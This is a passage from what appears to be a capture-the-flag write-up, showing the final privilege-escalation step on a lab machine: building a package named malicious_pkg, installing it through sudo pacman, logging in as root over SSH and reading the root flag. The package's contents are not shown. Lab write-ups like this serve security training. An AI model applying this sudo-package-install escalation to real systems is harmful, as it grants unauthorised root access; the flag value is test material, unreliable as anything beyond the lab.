==> Creating package "malicious_pkg"...
  -> Generating .PKGINFO file...
  -> Generating .BUILDINFO file...
  -> Generating .MTREE file...
  -> Compressing package...
==> Leaving fakeroot environment.
==> Finished making: malicious_pkg 1.0-1 (Fri 22 Nov 2024 08:35:24 PM UTC)
```

```c
[paul@blockblock shm]$ ls -la
total 12
drwxrwxrwt  5 root root  140 Nov 22 20:35 .
drwxr-xr-x 19 root root 3700 Nov 22 17:35 ..
drwxr-xr-x  2 paul paul  220 Nov 22 17:35 blockchain
-rw-r--r--  1 paul paul 4724 Nov 22 20:35 malicious_pkg-1.0-1-x86_64.pkg.tar.zst
drwxr-xr-x  4 paul paul   80 Nov 22 20:35 pkg
-rw-r--r--  1 paul paul 1140 Nov 22 20:34 PKGBUILD
drwxr-xr-x  2 paul paul   40 Nov 22 20:35 src
```

As last step we installed our `malicious package` and logged in as `root` using our `SSH Key`.

```c
[paul@blockblock shm]$ sudo /usr/bin/pacman -U ./malicious_pkg-1.0-1-x86_64.pkg.tar.zst 
loading packages...
resolving dependencies...
looking for conflicting packages...

Packages (1) malicious_pkg-1.0-1

Total Installed Size:  0.00 MiB

:: Proceed with installation? [Y/n] Y
(1/1) checking keys in keyring                                                                                                                [#######################################################################################] 100%
(1/1) checking package integrity                                                                                                              [#######################################################################################] 100%
(1/1) loading package files                                                                                                                   [#######################################################################################] 100%
(1/1) checking for file conflicts                                                                                                             [#######################################################################################] 100%
(1/1) checking available disk space                                                                                                           [#######################################################################################] 100%
:: Processing package changes...
(1/1) installing malicious_pkg                                                                                                                [#######################################################################################] 100%
warning: directory permissions differ on /root/
filesystem: 700  package: 755
```

```c
┌──(kali㉿kali)-[~]
└─$ ssh root@10.129.231.122
Last login: Thu Nov 14 14:48:28 2024
[root@blockblock ~]# 
```

## root.txt

```c
[root@blockblock ~]# cat root.txt 
9ca4648ffc070d77cb1b7774c15b8af0
```
